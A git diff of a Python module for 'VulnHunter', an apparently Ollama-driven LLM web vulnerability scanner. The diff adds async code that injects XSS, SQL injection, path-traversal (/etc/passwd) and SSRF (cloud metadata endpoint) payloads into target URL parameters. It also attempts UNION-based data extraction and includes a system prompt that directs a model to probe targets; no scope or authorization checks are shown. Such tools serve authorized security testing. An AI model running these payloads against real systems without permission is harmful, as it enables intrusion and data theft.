@@ -1,12 +1,17 @@
 """
-LLM Interface - Ollama integration for VulnHunter
-This module provides the interface between Ollama LLM and the vulnerability hunting tools
+VulnHunter - Fast, Smart Vulnerability Scanner
+Redesigned for speed, accuracy, and real exploitation
 """
 
-import json
 import re
-from typing import Dict, List, Optional, Any, Callable
+import json
+import asyncio
+import aiohttp
+import time
+from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass, field
+from urllib.parse import urlparse, parse_qs, urlencode, urljoin
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 
 try:
@@ -14,435 +19,631 @@ try:
     OLLAMA_AVAILABLE = True
 except ImportError:
     OLLAMA_AVAILABLE = False
-    print("Warning: ollama package not installed. Install with: pip install ollama")
-
-from tools.web_tools import WebTools
-from tools.search_tools import SearchTools
-from tools.report_tools import ReportTools
 
 
 @dataclass
-class ToolDefinition:
-    """Definition of a tool for the LLM"""
-    name: str
-    description: str
-    parameters: Dict[str, Any]
-    function: Callable
-    examples: List[str] = field(default_factory=list)
+class Vulnerability:
+    """Confirmed vulnerability"""
+    vuln_type: str
+    url: str
+    param: str
+    payload: str
+    evidence: str
+    severity: str
+    confirmed: bool
+    extracted_data: Optional[str] = None
+    
+    def to_dict(self):
+        return {
+            "type": self.vuln_type,
+            "url": self.url,
+            "param": self.param,
+            "payload": self.payload,
+            "evidence": self.evidence,
+            "severity": self.severity,
+            "confirmed": self.confirmed,
+            "extracted_data": self.extracted_data
+        }
+
+
+class FastScanner:
+    """
+    Ultra-fast parallel vulnerability scanner
+    - Async HTTP for speed
+    - Smart payload generation
+    - Confirms vulnerabilities before reporting
+    - Extracts data to prove impact
+    """
+    
+    def __init__(self, timeout: int = 10, max_concurrent: int = 20):
+        self.timeout = aiohttp.ClientTimeout(total=timeout)
+        self.max_concurrent = max_concurrent
+        self.findings: List[Vulnerability] = []
+        self.tested_urls: set = set()
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        }
+        
+        # Smart payloads - fewer but more effective
+        self.xss_payloads = [
+            '<script>alert(1)</script>',
+            '"><script>alert(1)</script>',
+            "'-alert(1)-'",
+            '<img src=x onerror=alert(1)>',
+            '"><img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            'javascript:alert(1)',
+            '${alert(1)}',
+            '{{constructor.constructor("alert(1)")()}}',
+        ]
+        
+        self.sqli_payloads = [
+            ("'", ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "unclosed quotation"]),
+            ("' OR '1'='1", ["sql syntax", "warning"]),
+            ("' OR 1=1--", ["sql syntax", "warning"]),
+            ("1' AND '1'='1", []),
+            ("1' AND '1'='2", []),
+            ("' UNION SELECT NULL--", ["sql syntax", "column"]),
+            ("'; SELECT SLEEP(3)--", []),
+        ]
+        
+        self.lfi_payloads = [
+            ("../../../etc/passwd", ["root:", "nobody:", "/bin/"]),
+            ("....//....//....//etc/passwd", ["root:", "nobody:"]),
+            ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
+            ("/etc/passwd", ["root:", "nobody:"]),
+            ("file:///etc/passwd", ["root:", "nobody:"]),
+            ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
+        ]
+        
+        self.ssrf_payloads = [
+            ("http://127.0.0.1", ["localhost", "127.0.0.1"]),
+            ("http://localhost", ["localhost"]),
+            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
+            ("http://[::1]", ["localhost"]),
+            ("http://0.0.0.0", []),
+            ("http://metadata.google.internal/", ["instance"]),
+        ]
+
+    async def _fetch(self, session: aiohttp.ClientSession, url: str, 
+                     method: str = "GET", data: Optional[Dict] = None) -> Tuple[str, int, float]:
+        """Fast async fetch with timing"""
+        start = time.time()
+        try:
+            if method == "POST":
+                async with session.post(url, data=data, headers=self.headers, 
+                                        ssl=False, allow_redirects=True) as resp:
+                    body = await resp.text()
+                    return body, resp.status, time.time() - start
+            else:
+                async with session.get(url, headers=self.headers, 
+                                       ssl=False, allow_redirects=True) as resp:
+                    body = await resp.text()
+                    return body, resp.status, time.time() - start
+        except Exception as e:
+            return str(e), 0, time.time() - start
+
+    async def _verify_url(self, session: aiohttp.ClientSession, url: str) -> bool:
+        """Verify URL exists before testing"""
+        try:
+            async with session.head(url, headers=self.headers, 
+                                    ssl=False, allow_redirects=True, timeout=self.timeout) as resp:
+                return resp.status < 500
+        except:
+            try:
+                async with session.get(url, headers=self.headers, 
+                                       ssl=False, allow_redirects=True, timeout=self.timeout) as resp:
+                    return resp.status < 500
+            except:
+                return False
+
+    def _inject_param(self, url: str, param: str, payload: str) -> str:
+        """Inject payload into URL parameter"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        params[param] = [payload]
+        new_query = urlencode(params, doseq=True)
+        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+
+    async def find_forms_and_params(self, url: str) -> Dict[str, Any]:
+        """
+        Fast form and parameter discovery
+        Returns forms, URL params, and internal links
+        """
+        async with aiohttp.ClientSession(timeout=self.timeout) as session:
+            body, status, _ = await self._fetch(session, url)
+            
+            if status == 0:
+                return {"error": "Failed to fetch URL", "forms": [], "params": [], "links": []}
+            
+            base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+            
+            # Extract forms
+            forms = []
+            form_pattern = r'<form([^>]*)>(.*?)</form>'
+            for match in re.finditer(form_pattern, body, re.IGNORECASE | re.DOTALL):
+                attrs, content = match.groups()
+                
+                action = re.search(r'action=["\']([^"\']*)["\']', attrs)
+                method = re.search(r'method=["\']([^"\']*)["\']', attrs)
+                
+                action_url = urljoin(url, action.group(1)) if action else url
+                form_method = method.group(1).upper() if method else "GET"
+                
+                # Get inputs
+                inputs = []
+                for inp in re.finditer(r'<input([^>]*)/?>', content, re.IGNORECASE):
+                    inp_attrs = inp.group(1)
+                    name = re.search(r'name=["\']([^"\']*)["\']', inp_attrs)
+                    inp_type = re.search(r'type=["\']([^"\']*)["\']', inp_attrs)
+                    if name:
+                        inputs.append({
+                            "name": name.group(1),
+                            "type": inp_type.group(1) if inp_type else "text"
+                        })
+                
+                # Get textareas
+                for ta in re.finditer(r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE):
+                    inputs.append({"name": ta.group(1), "type": "textarea"})
+                
+                if inputs:
+                    forms.append({
+                        "action": action_url,
+                        "method": form_method,
+                        "inputs": inputs
+                    })
+            
+            # Extract URL parameters from links
+            params_found = set()
+            link_pattern = r'href=["\']([^"\']*\?[^"\']*)["\']'
+            for match in re.finditer(link_pattern, body, re.IGNORECASE):
+                href = match.group(1)
+                full_url = urljoin(url, href)
+                parsed = urlparse(full_url)
+                for p in parse_qs(parsed.query).keys():
+                    params_found.add(p)
+            
+            # Extract internal links (same domain only)
+            internal_links = set()
+            all_links = re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE)
+            for link in all_links:
+                if link.startswith('#') or link.startswith('javascript:') or link.startswith('mailto:'):
+                    continue
+                full_link = urljoin(url, link)
+                if urlparse(full_link).netloc == urlparse(url).netloc:
+                    internal_links.add(full_link.split('#')[0])
+            
+            # Verify top links actually exist
+            verified_links = []
+            tasks = [self._verify_url(session, link) for link in list(internal_links)[:30]]
+            results = await asyncio.gather(*tasks)
+            for link, exists in zip(list(internal_links)[:30], results):
+                if exists:
+                    verified_links.append(link)
+            
+            return {
+                "forms": forms,
+                "params": list(params_found),
+                "links": verified_links[:20],
+                "total_links": len(internal_links)
+            }
+
+    async def test_xss(self, url: str, param: str) -> List[Vulnerability]:
+        """Fast XSS testing with confirmation - checks for HTML context"""
+        results = []
+        async with aiohttp.ClientSession(timeout=self.timeout) as session:
+            # First verify URL works
+            if not await self._verify_url(session, url):
+                return results
+            
+            # Get baseline to check content type
+            baseline, status, _ = await self._fetch(session, url)
+            if not status:
+                return results
+            
+            # Only test if response looks like HTML (not JSON/XML API)
+            is_html = '<html' in baseline.lower() or '<body' in baseline.lower() or '<!doctype' in baseline.lower()
+            
+            for payload in self.xss_payloads:
+                test_url = self._inject_param(url, param, payload)
+                body, status, _ = await self._fetch(session, test_url)
+                
+                if status and payload in body:
+                    # Check if it's truly reflected in HTML context (not JSON)
+                    body_lower = body.lower()
+                    in_html_context = (is_html or '<html' in body_lower or '<body' in body_lower)
+                    not_in_json = '"args"' not in body_lower and '"test"' not in body_lower
+                    
+                    if in_html_context or not_in_json:
+                        results.append(Vulnerability(
+                            vuln_type="XSS",
+                            url=url,
+                            param=param,
+                            payload=payload,
+                            evidence=f"Payload reflected in HTML response",
+                            severity="high",
+                            confirmed=True
+                        ))
+                        break  # Found confirmed XSS, stop testing
+        
+        return results
+
+    async def test_sqli(self, url: str, param: str) -> List[Vulnerability]:
+        """Fast SQLi testing with confirmation and data extraction"""
+        results = []
+        async with aiohttp.ClientSession(timeout=self.timeout) as session:
+            if not await self._verify_url(session, url):
+                return results
+            
+            # Get baseline response
+            baseline_body, baseline_status, baseline_time = await self._fetch(session, url)
+            baseline_len = len(baseline_body)
+            
+            for payload, error_patterns in self.sqli_payloads:
+                test_url = self._inject_param(url, param, payload)
+                body, status, elapsed = await self._fetch(session, test_url)
+                
+                # Check for SQL errors
+                body_lower = body.lower()
+                for pattern in error_patterns:
+                    if pattern in body_lower:
+                        # Try to extract database info
+                        db_info = self._extract_db_info(body)
+                        results.append(Vulnerability(
+                            vuln_type="SQLi",
+                            url=url,
+                            param=param,
+                            payload=payload,
+                            evidence=f"SQL error detected: {pattern}",
+                            severity="critical",
+                            confirmed=True,
+                            extracted_data=db_info
+                        ))
+                        
+                        # Try to extract data with UNION
+                        await self._try_union_extract(session, url, param, results)
+                        return results
+            
+            # Boolean-based detection
+            true_url = self._inject_param(url, param, "1' AND '1'='1")
+            false_url = self._inject_param(url, param, "1' AND '1'='2")
+            
+            true_body, _, _ = await self._fetch(session, true_url)
+            false_body, _, _ = await self._fetch(session, false_url)
+            
+            if len(true_body) != len(false_body) and abs(len(true_body) - len(false_body)) > 50:
+                results.append(Vulnerability(
+                    vuln_type="SQLi (Boolean)",
+                    url=url,
+                    param=param,
+                    payload="1' AND '1'='1 vs 1' AND '1'='2",
+                    evidence=f"Response length differs: {len(true_body)} vs {len(false_body)}",
+                    severity="critical",
+                    confirmed=True
+                ))
+            
+            # Time-based detection
+            time_url = self._inject_param(url, param, "1' AND SLEEP(3)--")
+            _, _, elapsed = await self._fetch(session, time_url)
+            
+            if elapsed > 2.5:
+                results.append(Vulnerability(
+                    vuln_type="SQLi (Time-based)",
+                    url=url,
+                    param=param,
+                    payload="1' AND SLEEP(3)--",
+                    evidence=f"Response delayed by {elapsed:.2f}s",
+                    severity="critical",
+                    confirmed=True
+                ))
+        
+        return results
+
+    def _extract_db_info(self, body: str) -> Optional[str]:
+        """Extract database information from error messages"""
+        patterns = [
+            (r"MySQL server version.*?'", "MySQL version found"),
+            (r"PostgreSQL.*?ERROR", "PostgreSQL detected"),
+            (r"Microsoft SQL Server", "MSSQL detected"),
+            (r"ORA-\d{5}", "Oracle detected"),
+            (r"SQLite.*?error", "SQLite detected"),
+        ]
+        for pattern, msg in patterns:
+            if re.search(pattern, body, re.IGNORECASE):
+                return msg
+        return None
+
+    async def _try_union_extract(self, session: aiohttp.ClientSession, 
+                                  url: str, param: str, results: List[Vulnerability]):
+        """Try to extract data using UNION injection"""
+        for cols in range(1, 10):
+            nulls = ",".join(["NULL"] * cols)
+            union_payload = f"' UNION SELECT {nulls}--"
+            test_url = self._inject_param(url, param, union_payload)
+            body, status, _ = await self._fetch(session, test_url)
+            
+            if status == 200 and "error" not in body.lower():
+                # Try to extract version
+                version_payload = f"' UNION SELECT {'NULL,'*(cols-1)}@@version--"
+                test_url = self._inject_param(url, param, version_payload)
+                body, _, _ = await self._fetch(session, test_url)
+                
+                if "@@version" not in body and status == 200:
+                    results.append(Vulnerability(
+                        vuln_type="SQLi (UNION)",
+                        url=url,
+                        param=param,
+                        payload=version_payload,
+                        evidence=f"UNION injection with {cols} columns works",
+                        severity="critical",
+                        confirmed=True,
+                        extracted_data=f"Columns: {cols}"
+                    ))
+                break
+
+    async def test_lfi(self, url: str, param: str) -> List[Vulnerability]:
+        """Fast LFI testing with confirmation"""
+        results = []
+        async with aiohttp.ClientSession(timeout=self.timeout) as session:
+            if not await self._verify_url(session, url):
+                return results
+            
+            for payload, indicators in self.lfi_payloads:
+                test_url = self._inject_param(url, param, payload)
+                body, status, _ = await self._fetch(session, test_url)
+                
+                if status:
+                    for indicator in indicators:
+                        if indicator in body:
+                            # Extract some file content as proof
+                            extract = body[:500] if "root:" in body else None
+                            results.append(Vulnerability(
+                                vuln_type="LFI",
+                                url=url,
+                                param=param,
+                                payload=payload,
+                                evidence=f"File content indicator found: {indicator}",
+                                severity="critical",
+                                confirmed=True,
+                                extracted_data=extract
+                            ))
+                            return results
+        
+        return results
+
+    async def test_ssrf(self, url: str, param: str) -> List[Vulnerability]:
+        """Fast SSRF testing - confirms actual internal resource access"""
+        results = []
+        async with aiohttp.ClientSession(timeout=self.timeout) as session:
+            if not await self._verify_url(session, url):
+                return results
+            
+            # Get baseline to compare
+            baseline, baseline_status, _ = await self._fetch(session, url)
+            
+            for payload, indicators in self.ssrf_payloads:
+                test_url = self._inject_param(url, param, payload)
+                body, status, _ = await self._fetch(session, test_url)
+                
+                if status:
+                    # Check for real SSRF indicators (not just reflection)
+                    body_lower = body.lower()
+                    
+                    # Skip if this looks like simple reflection (JSON echo)
+                    if f'"{payload.lower()}"' in body_lower or f':{payload.lower()}' in body_lower:
+                        # This is likely just echoing the URL, not fetching it
+                        continue
+                    
+                    for indicator in indicators:
+                        if indicator.lower() in body_lower:
+                            # Additional check: indicator shouldn't be in baseline
+                            if indicator.lower() not in baseline.lower():
+                                results.append(Vulnerability(
+                                    vuln_type="SSRF",
+                                    url=url,
+                                    param=param,
+                                    payload=payload,
+                                    evidence=f"Internal resource accessed: {indicator}",
+                                    severity="critical",
+                                    confirmed=True,
+                                    extracted_data=body[:500] if "ami-id" in body or "instance" in body else None
+                                ))
+                                return results
+        
+        return results
+
+    async def full_scan(self, target_url: str) -> Dict[str, Any]:
+        """
+        Complete fast scan of target
+        1. Discover forms and parameters
+        2. Test all parameters in parallel
+        3. Return only confirmed vulnerabilities
+        """
+        start_time = time.time()
+        
+        # Step 1: Fast discovery
+        discovery = await self.find_forms_and_params(target_url)
+        
+        if "error" in discovery:
+            return {"error": discovery["error"], "vulns": []}
+        
+        all_vulns = []
+        
+        # Step 2: Build test targets
+        test_targets = []
+        
+        # From URL parameters
+        parsed = urlparse(target_url)
+        url_params = parse_qs(parsed.query)
+        for param in url_params:
+            test_targets.append((target_url, param))
+        
+        # From discovered links with params
+        for link in discovery["links"]:
+            parsed = urlparse(link)
+            for param in parse_qs(parsed.query):
+                test_targets.append((link, param))
+        
+        # From forms
+        for form in discovery["forms"]:
+            for inp in form["inputs"]:
+                if inp["type"] not in ["submit", "button", "hidden"]:
+                    # Build test URL for form
+                    form_url = form["action"]
+                    if "?" not in form_url:
+                        form_url += f"?{inp['name']}=test"
+                    test_targets.append((form_url, inp["name"]))
+        
+        # Step 3: Parallel testing
+        async def test_all(url: str, param: str):
+            vulns = []
+            vulns.extend(await self.test_xss(url, param))
+            vulns.extend(await self.test_sqli(url, param))
+            vulns.extend(await self.test_lfi(url, param))
+            vulns.extend(await self.test_ssrf(url, param))
+            return vulns
+        
+        # Limit concurrent tests
+        semaphore = asyncio.Semaphore(self.max_concurrent)
+        
+        async def bounded_test(url: str, param: str):
+            async with semaphore:
+                return await test_all(url, param)
+        
+        tasks = [bounded_test(url, param) for url, param in test_targets[:50]]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if isinstance(result, list):
+                all_vulns.extend(result)
+        
+        elapsed = time.time() - start_time
+        
+        return {
+            "target": target_url,
+            "scan_time_seconds": round(elapsed, 2),
+            "forms_found": len(discovery["forms"]),
+            "params_tested": len(test_targets),
+            "links_found": len(discovery["links"]),
+            "vulnerabilities": [v.to_dict() for v in all_vulns],
+            "vuln_count": len(all_vulns)
+        }
 
 
 class VulnHunterLLM:
     """
-    LLM-powered vulnerability hunter using Ollama
-    
-    This class provides:
-    - Easy tool interface for any Ollama model
-    - Automatic tool calling and result handling
-    - Conversation memory for context
-    - Simple API for the LLM to use all vulnerability hunting tools
-    
-    Usage:
-        hunter = VulnHunterLLM(model="llama3.1:8b")
-        hunter.start("https://example.com")
+    LLM-powered vulnerability hunter
+    Uses tools for fast, accurate scanning
     """
     
     def __init__(self, model: str = "llama3.1:8b", proxy: Optional[str] = None):
         self.model = model
-        self.web_tools = WebTools(proxy=proxy)
-        self.search_tools = SearchTools()
-        self.report_tools = ReportTools()
-        
-        # Conversation history
-        self.conversation: List[Dict[str, str]] = []
+        self.scanner = FastScanner()
+        self.conversation: List[Dict] = []
         self.findings: List[Dict] = []
+        self.target_url = ""
         
-        # Target info
-        self.target_url: str = ""
-        self.target_info: Dict = {}
-        
-        # Build tool registry
-        self.tools = self._build_tool_registry()
-        
-        # System prompt for the LLM
-        self.system_prompt = self._build_system_prompt()
+        self.system_prompt = """You are VulnHunter, an expert security researcher. You have tools to scan web apps for vulnerabilities.
 
-    def _build_tool_registry(self) -> Dict[str, ToolDefinition]:
-        """Build the tool registry with all available tools"""
-        tools = {}
-        
-        # ==================== Web Tools ====================
-        tools["fetch"] = ToolDefinition(
-            name="fetch",
-            description="Fetch a URL and get the response. Use this to make HTTP requests.",
-            parameters={
-                "url": {"type": "string", "description": "The URL to fetch", "required": True},
-                "method": {"type": "string", "description": "HTTP method (GET, POST, etc.)", "default": "GET"},
-                "headers": {"type": "object", "description": "Custom headers"},
-                "data": {"type": "object", "description": "Form data for POST requests"},
-                "json_data": {"type": "object", "description": "JSON body for POST requests"}
-            },
-            function=self.web_tools.fetch,
-            examples=[
-                'fetch(url="https://example.com")',
-                'fetch(url="https://example.com/api", method="POST", json_data={"user": "test"})'
-            ]
-        )
-        
-        tools["crawl"] = ToolDefinition(
-            name="crawl",
-            description="Crawl a website to discover URLs, forms, parameters, and structure.",
-            parameters={
-                "url": {"type": "string", "description": "Starting URL to crawl", "required": True},
-                "depth": {"type": "integer", "description": "Crawl depth (1-3 recommended)", "default": 2}
-            },
-            function=self.web_tools.crawl,
-            examples=['crawl(url="https://example.com", depth=2)']
-        )
-        
-        tools["analyze"] = ToolDefinition(
-            name="analyze",
-            description="Deep analysis of a page including scripts, forms, hidden inputs, and security issues.",
-            parameters={
-                "url": {"type": "string", "description": "URL to analyze", "required": True}
-            },
-            function=self.web_tools.analyze,
-            examples=['analyze(url="https://example.com/login")']
-        )
-        
-        tools["read_source"] = ToolDefinition(
-            name="read_source",
-            description="Read the source code of a page for manual analysis.",
-            parameters={
-                "url": {"type": "string", "description": "URL to read", "required": True}
-            },
-            function=self.web_tools.read_source,
-            examples=['read_source(url="https://example.com/page")']
-        )
-        
-        tools["send_request"] = ToolDefinition(
-            name="send_request",
-            description="Send a fully customized HTTP request with any method, headers, and body.",
-            parameters={
-                "method": {"type": "string", "description": "HTTP method", "required": True},
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "headers": {"type": "object", "description": "Custom headers"},
-                "params": {"type": "object", "description": "URL parameters"},
-                "data": {"type": "object", "description": "Form data"},
-                "json_data": {"type": "object", "description": "JSON body"},
-                "cookies": {"type": "object", "description": "Custom cookies"},
-                "raw_body": {"type": "string", "description": "Raw body string"}
-            },
-            function=self.web_tools.send_request,
-            examples=[
-                'send_request(method="POST", url="https://example.com/api", json_data={"action": "test"})'
-            ]
-        )
-        
-        tools["inject_payload"] = ToolDefinition(
-            name="inject_payload",
-            description="Inject a payload into a URL parameter. Easy way to test payloads.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "Parameter to inject into", "required": True},
-                "payload": {"type": "string", "description": "Payload to inject", "required": True},
-                "method": {"type": "string", "description": "HTTP method", "default": "GET"}
-            },
-            function=self.web_tools.inject_payload,
-            examples=[
-                'inject_payload(url="https://example.com/search?q=test", param="q", payload="<script>alert(1)</script>")'
-            ]
-        )
-        
-        # ==================== Vulnerability Scanners ====================
-        tools["scan_xss"] = ToolDefinition(
-            name="scan_xss",
-            description="Scan a parameter for XSS vulnerabilities.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "Parameter to test", "required": True},
-                "method": {"type": "string", "description": "HTTP method", "default": "GET"},
-                "category": {"type": "string", "description": "Payload category: basic, filter_bypass, polyglot, waf_bypass", "default": "basic"}
-            },
-            function=self.web_tools.scan_xss,
-            examples=['scan_xss(url="https://example.com/search?q=test", param="q")']
-        )
-        
-        tools["scan_sqli"] = ToolDefinition(
-            name="scan_sqli",
-            description="Scan a parameter for SQL injection vulnerabilities.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "Parameter to test", "required": True},
-                "method": {"type": "string", "description": "HTTP method", "default": "GET"},
-                "test_types": {"type": "array", "description": "Types: error, boolean, time, union", "default": ["error", "boolean"]}
-            },
-            function=self.web_tools.scan_sqli,
-            examples=['scan_sqli(url="https://example.com/user?id=1", param="id")']
-        )
-        
-        tools["scan_ssrf"] = ToolDefinition(
-            name="scan_ssrf",
-            description="Scan for SSRF vulnerabilities to access internal resources.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "URL parameter to test", "required": True},
-                "categories": {"type": "array", "description": "Categories: localhost, cloud, internal", "default": ["localhost", "cloud"]}
-            },
-            function=self.web_tools.scan_ssrf,
-            examples=['scan_ssrf(url="https://example.com/fetch?url=http://google.com", param="url")']
-        )
-        
-        tools["scan_lfi"] = ToolDefinition(
-            name="scan_lfi",
-            description="Scan for Local File Inclusion vulnerabilities.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "File parameter to test", "required": True},
-                "os_type": {"type": "string", "description": "OS type: linux or windows", "default": "linux"}
-            },
-            function=self.web_tools.scan_lfi,
-            examples=['scan_lfi(url="https://example.com/view?file=report.pdf", param="file")']
-        )
-        
-        tools["scan_auth"] = ToolDefinition(
-            name="scan_auth",
-            description="Scan authentication for bypass vulnerabilities and weak credentials.",
-            parameters={
-                "login_url": {"type": "string", "description": "Login form URL", "required": True},
-                "username_field": {"type": "string", "description": "Username field name", "default": "username"},
-                "password_field": {"type": "string", "description": "Password field name", "default": "password"}
-            },
-            function=self.web_tools.scan_auth,
-            examples=['scan_auth(login_url="https://example.com/login")']
-        )
-        
-        tools["scan_idor"] = ToolDefinition(
-            name="scan_idor",
-            description="Scan for IDOR (Insecure Direct Object Reference) vulnerabilities.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "ID parameter", "required": True},
-                "current_id": {"type": "string", "description": "Your current user's ID", "required": True}
-            },
-            function=self.web_tools.scan_idor,
-            examples=['scan_idor(url="https://example.com/user?id=123", param="id", current_id="123")']
-        )
-        
-        tools["quick_scan"] = ToolDefinition(
-            name="quick_scan",
-            description="Quick scan for XSS, SQLi, and LFI on a parameter.",
-            parameters={
-                "url": {"type": "string", "description": "Target URL", "required": True},
-                "param": {"type": "string", "description": "Parameter to test", "required": True}
-            },
-            function=self.web_tools.quick_scan,
-            examples=['quick_scan(url="https://example.com/search?q=test", param="q")']
-        )
-        
-        # ==================== Payload Tools ====================
-        tools["generate_payload"] = ToolDefinition(
-            name="generate_payload",
-            description="Generate a sophisticated payload for a vulnerability type.",
-            parameters={
-                "vuln_type": {"type": "string", "description": "Type: xss, sqli, ssrf, lfi, cmd, ssti", "required": True},
-                "context": {"type": "string", "description": "For XSS: html, attribute, javascript, url"},
-                "technique": {"type": "string", "description": "For SQLi: union, error, blind_boolean, blind_time"},
-                "db": {"type": "string", "description": "Database: mysql, mssql, postgresql, oracle"},
-                "bypass": {"type": "string", "description": "Bypass technique: encoding, waf, quotes, tags"}
-            },
-            function=self.web_tools.generate_payload,
-            examples=[
-                'generate_payload(vuln_type="xss", context="html", bypass="waf")',
-                'generate_payload(vuln_type="sqli", technique="union", db="mysql")'
-            ]
-        )
-        
-        tools["get_payloads"] = ToolDefinition(
-            name="get_payloads",
-            description="Get a list of pre-built payloads for a vulnerability category.",
-            parameters={
-                "category": {"type": "string", "description": "Category: xss, sqli, ssrf, lfi, cmd", "required": True}
-            },
-            function=self.web_tools.get_payloads,
-            examples=['get_payloads(category="xss")']
-        )
-        
-        tools["mutate_payload"] = ToolDefinition(
-            name="mutate_payload",
-            description="Generate variations/mutations of a payload to bypass filters.",
-            parameters={
-                "payload": {"type": "string", "description": "Original payload", "required": True},
-                "count": {"type": "integer", "description": "Number of mutations", "default": 5}
-            },
-            function=self.web_tools.mutate_payload,
-            examples=['mutate_payload(payload="<script>alert(1)</script>", count=5)']
-        )
-        
-        # ==================== Session/Auth Tools ====================
-        tools["login"] = ToolDefinition(
-            name="login",
-            description="Login to the application with credentials.",
-            parameters={
-                "login_url": {"type": "string", "description": "Login form URL", "required": True},
-                "username": {"type": "string", "description": "Username", "required": True},
-                "password": {"type": "string", "description": "Password", "required": True},
-                "username_field": {"type": "string", "description": "Username field name", "default": "username"},
-                "password_field": {"type": "string", "description": "Password field name", "default": "password"},
-                "csrf_field": {"type": "string", "description": "CSRF token field name"}
-            },
-            function=self.web_tools.login,
-            examples=['login(login_url="https://example.com/login", username="test", password="test123")']
-        )
-        
-        tools["set_cookie"] = ToolDefinition(
-            name="set_cookie",
-            description="Set a cookie for subsequent requests.",
-            parameters={
-                "name": {"type": "string", "description": "Cookie name", "required": True},
-                "value": {"type": "string", "description": "Cookie value", "required": True}
-            },
-            function=self.web_tools.set_cookie,
-            examples=['set_cookie(name="session", value="abc123")']
-        )
-        
-        tools["set_header"] = ToolDefinition(
-            name="set_header",
-            description="Set a header for subsequent requests.",
-            parameters={
-                "name": {"type": "string", "description": "Header name", "required": True},
-                "value": {"type": "string", "description": "Header value", "required": True}
-            },
-            function=self.web_tools.set_header,
-            examples=['set_header(name="Authorization", value="Bearer token123")']
-        )
-        
-        # ==================== Search Tools ====================
-        tools["search_cve"] = ToolDefinition(
-            name="search_cve",
-            description="Search for CVE details and vulnerability information.",
-            parameters={
-                "cve_id": {"type": "string", "description": "CVE ID (e.g., CVE-2021-44228)", "required": True}
-            },
-            function=self.search_tools.search_cve,
-            examples=['search_cve(cve_id="CVE-2021-44228")']
-        )
-        
-        tools["search_vulnerability"] = ToolDefinition(
-            name="search_vulnerability",
-            description="Search for vulnerability information and related payloads.",
-            parameters={
-                "query": {"type": "string", "description": "Search query", "required": True},
-                "technology": {"type": "string", "description": "Technology filter"}
-            },
-            function=self.search_tools.search_vulnerability,
-            examples=['search_vulnerability(query="XSS bypass", technology="react")']
-        )
-        
-        tools["search_exploit"] = ToolDefinition(
-            name="search_exploit",
-            description="Search for exploits and POCs.",
-            parameters={
-                "query": {"type": "string", "description": "Search query", "required": True},
-                "cve": {"type": "string", "description": "Specific CVE to search for"}
-            },
-            function=self.search_tools.search_exploit,
-            examples=['search_exploit(query="log4j", cve="CVE-2021-44228")']
-        )
-        
-        tools["search_technology_vulns"] = ToolDefinition(
-            name="search_technology_vulns",
-            description="Search for known vulnerabilities in a specific technology.",
-            parameters={
-                "technology": {"type": "string", "description": "Technology name", "required": True},
-                "version": {"type": "string", "description": "Version number"}
-            },
-            function=self.search_tools.search_technology_vulns,
-            examples=['search_technology_vulns(technology="wordpress", version="5.8")']
-        )
-        
-        # ==================== Report Tools ====================
-        tools["create_report"] = ToolDefinition(
-            name="create_report",
-            description="Create a detailed vulnerability report.",
-            parameters={
-                "vuln_type": {"type": "string", "description": "Vulnerability type", "required": True},
-                "url": {"type": "string", "description": "Affected URL", "required": True},
-                "parameter": {"type": "string", "description": "Vulnerable parameter"},
-                "payload": {"type": "string", "description": "Payload used"}
-            },
-            function=lambda **kwargs: self.report_tools.create_report(**kwargs).to_dict(),
-            examples=['create_report(vuln_type="xss", url="https://example.com", parameter="q", payload="<script>alert(1)</script>")']
-        )
-        
-        tools["get_findings"] = ToolDefinition(
-            name="get_findings",
-            description="Get all vulnerabilities found so far.",
-            parameters={},
-            function=self.web_tools.get_findings,
-            examples=['get_findings()']
-        )
-        
-        return tools
+## Your Tools
+1. **discover(url)** - Find forms, parameters, and internal links
+2. **scan(url)** - Full vulnerability scan (XSS, SQLi, LFI, SSRF)
+3. **test_xss(url, param)** - Test specific parameter for XSS
+4. **test_sqli(url, param)** - Test for SQL injection
+5. **test_lfi(url, param)** - Test for file inclusion
+6. **test_ssrf(url, param)** - Test for SSRF
+7. **report()** - Get all confirmed vulnerabilities
 
-    def _build_system_prompt(self) -> str:
-        """Build the system prompt for the LLM"""
-        return """You are VulnHunter, an expert AI security researcher specializing in web application vulnerability hunting. Your goal is to find critical security vulnerabilities like those reported on HackerOne.
+## Usage
+Call tools with: TOOL: tool_name(url="...", param="...")
 
-## Your Capabilities
-You have access to powerful tools for:
-1. **Web Reconnaissance**: Crawl sites, analyze pages, read source code
-2. **Vulnerability Scanning**: Test for XSS, SQLi, SSRF, LFI, IDOR, auth bypass
-3. **Payload Generation**: Create sophisticated payloads with bypass techniques
-4. **Research**: Search CVE databases, find exploits, research technologies
-5. **Reporting**: Generate professional vulnerability reports
+Example workflow:
+1. TOOL: discover(url="https://target.com") - Find attack surface
+2. TOOL: scan(url="https://target.com/search?q=test") - Scan a page
